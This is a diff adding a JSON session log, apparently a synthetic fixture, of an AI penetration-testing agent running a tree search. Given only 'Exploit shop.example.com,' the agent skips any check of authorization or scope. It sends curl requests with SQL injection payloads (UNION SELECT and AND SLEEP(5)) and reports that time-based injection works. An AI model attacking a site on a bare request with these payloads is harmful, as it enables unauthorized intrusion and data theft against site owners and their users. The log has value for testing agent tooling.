@@ -1,0 +1,272 @@
+{
+ "meta": {
+  "id": "session_lats0000000001",
+  "title": "Exploit path search",
+  "status": "active",
+  "currentPhase": "exploitation",
+  "iterationCount": 3,
+  "createdAt": "2026-10-10T09:00:00Z",
+  "updatedAt": "2026-10-10T09:01:16.000Z",
+  "running": false,
+  "highWaterSeq": 19
+ },
+ "events": [
+  {
+   "seq": 1,
+   "type": "user_message",
+   "at": "2026-10-10T09:00:07.000Z",
+   "data": {
+    "content": "Exploit shop.example.com."
+   }
+  },
+  {
+   "seq": 2,
+   "type": "phase_update",
+   "at": "2026-10-10T09:00:08.000Z",
+   "data": {
+    "current_phase": "informational",
+    "iteration_count": 0,
+    "attack_path_type": "",
+    "skill_workflow": null
+   }
+  },
+  {
+   "seq": 3,
+   "type": "phase_update",
+   "at": "2026-10-10T09:00:09.000Z",
+   "data": {
+    "current_phase": "exploitation",
+    "iteration_count": 1,
+    "attack_path_type": "sql_injection",
+    "skill_workflow": {
+     "skillId": "sql_injection",
+     "revision": 1,
+     "changeSetId": null
+    }
+   }
+  },
+  {
+   "seq": 4,
+   "type": "thinking",
+   "at": "2026-10-10T09:00:16.000Z",
+   "data": {
+    "iteration": 1,
+    "phase": "exploitation",
+    "thought": "Map it.",
+    "reasoning": "Reasoning for turn 1.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "green",
+    "stall": 0
+   }
+  },
+  {
+   "seq": 5,
+   "type": "tool_start",
+   "at": "2026-10-10T09:00:17.000Z",
+   "data": {
+    "tool_name": "execute_curl",
+    "tool_args": {
+     "args": "-s -i 'http://shop.example.com/api/v1/products?product_id=42&sessionToken=Zq81xLmP'"
+    },
+    "step_id": "step-0001-execute_curl"
+   }
+  },
+  {
+   "seq": 6,
+   "type": "lats_start",
+   "at": "2026-10-10T09:00:24.000Z",
+   "data": {
+    "search_id": "session_lats0000000001:root1",
+    "objective": "Reach data through the product search.",
+    "phase": "exploitation",
+    "budget": {
+     "max_rollouts": 8,
+     "max_depth": 4
+    },
+    "shadow_mode": false
+   }
+  },
+  {
+   "seq": 7,
+   "type": "lats_tree_update",
+   "at": "2026-10-10T09:00:31.000Z",
+   "data": {
+    "search_id": "session_lats0000000001:root1",
+    "snapshot": {
+     "nodes": [
+      {
+       "id": "n1"
+      }
+     ]
+    }
+   }
+  },
+  {
+   "seq": 9,
+   "type": "tool_complete",
+   "at": "2026-10-10T09:00:34.000Z",
+   "data": {
+    "tool_name": "execute_curl",
+    "success": true,
+    "output_summary": "ok",
+    "actionable_findings": [],
+    "recommended_next_steps": [],
+    "duration_ms": 900,
+    "tool_args": {
+     "args": "-s -i 'http://shop.example.com/api/v1/products?product_id=42&sessionToken=Zq81xLmP'"
+    },
+    "raw_output": "200",
+    "step_id": "step-0001-execute_curl"
+   }
+  },
+  {
+   "seq": 10,
+   "type": "thinking",
+   "at": "2026-10-10T09:00:41.000Z",
+   "data": {
+    "iteration": 2,
+    "phase": "exploitation",
+    "thought": "Follow the search's first branch.",
+    "reasoning": "Reasoning for turn 2.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "green",
+    "stall": 0
+   }
+  },
+  {
+   "seq": 11,
+   "type": "tool_start",
+   "at": "2026-10-10T09:00:42.000Z",
+   "data": {
+    "tool_name": "execute_curl",
+    "tool_args": {
+     "args": "-s 'http://shop.example.com/api/v1/products?product_id=42&sessionToken=Zq81xLmP%20UNION%20SELECT%201'"
+    },
+    "step_id": "step-0002-execute_curl"
+   }
+  },
+  {
+   "seq": 13,
+   "type": "tool_complete",
+   "at": "2026-10-10T09:00:45.000Z",
+   "data": {
+    "tool_name": "execute_curl",
+    "success": true,
+    "output_summary": "ok",
+    "actionable_findings": [],
+    "recommended_next_steps": [],
+    "duration_ms": 900,
+    "tool_args": {
+     "args": "-s 'http://shop.example.com/api/v1/products?product_id=42&sessionToken=Zq81xLmP%20UNION%20SELECT%201'"
+    },
+    "raw_output": "500",
+    "step_id": "step-0002-execute_curl"
+   }
+  },
+  {
+   "seq": 14,
+   "type": "thinking",
+   "at": "2026-10-10T09:00:52.000Z",
+   "data": {
+    "iteration": 3,
+    "phase": "exploitation",
+    "thought": "Follow its second branch.",
+    "reasoning": "Reasoning for turn 3.",
+    "action": "use_tool",
+    "input_tokens": 4200,
+    "output_tokens": 310,
+    "productivity_score": 0.7,
+    "productivity_tier": "green",
+    "stall": 0
+   }
+  },
+  {
+   "seq": 15,
+   "type": "tool_start",
+   "at": "2026-10-10T09:00:53.000Z",
+   "data": {
+    "tool_name": "execute_curl",
+    "tool_args": {
+     "args": "-s 'http://shop.example.com/api/v1/products?product_id=42&sessionToken=Zq81xLmP%20AND%20SLEEP(5)'"
+    },
+    "step_id": "step-0003-execute_curl"
+   }
+  },
+  {
+   "seq": 16,
+   "type": "lats_complete",
+   "at": "2026-10-10T09:01:00.000Z",
+   "data": {
+    "search_id": "session_lats0000000001:root1",
+    "outcome": "terminal_success",
+    "best_trajectory": [
+     {
+      "action": "union probe",
+      "result": "error"
+     },
+     {
+      "action": "time-based probe",
+      "result": "5 s delay"
+     }
+    ],
+    "metrics": {
+     "rollouts": 6,
+     "max_depth_reached": 3,
+     "nodes_total": 11,
+     "pruned_count": 2,
+     "outcome_terminal": true
+    }
+   }
+  },
+  {
+   "seq": 17,
+   "type": "tool_complete",
+   "at": "2026-10-10T09:01:02.000Z",
+   "data": {
+    "tool_name": "execute_curl",
+    "success": true,
+    "output_summary": "ok",
+    "actionable_findings": [],
+    "recommended_next_steps": [],
+    "duration_ms": 900,
+    "tool_args": {
+     "args": "-s 'http://shop.example.com/api/v1/products?product_id=42&sessionToken=Zq81xLmP%20AND%20SLEEP(5)'"
+    },
+    "raw_output": "200 after 5 s",
+    "step_id": "step-0003-execute_curl"
+   }
+  },
+  {
+   "seq": 18,
+   "type": "assistant_message",
+   "at": "2026-10-10T09:01:09.000Z",
+   "data": {
+    "content": "Time-based injection works.",
+    "phase": "exploitation",
+    "task_complete": true,
+    "response_tier": "full_report"
+   }
+  },
+  {
+   "seq": 19,
+   "type": "task_complete",
+   "at": "2026-10-10T09:01:16.000Z",
+   "data": {
+    "message": "Task completed successfully",
+    "final_phase": "exploitation",
+    "total_iterations": 3
+   }
+  }
+ ],
+ "truncated": {
+  "keptEvents": 17,
+  "droppedEvents": 2
+ },
+ "untrusted": true
+}
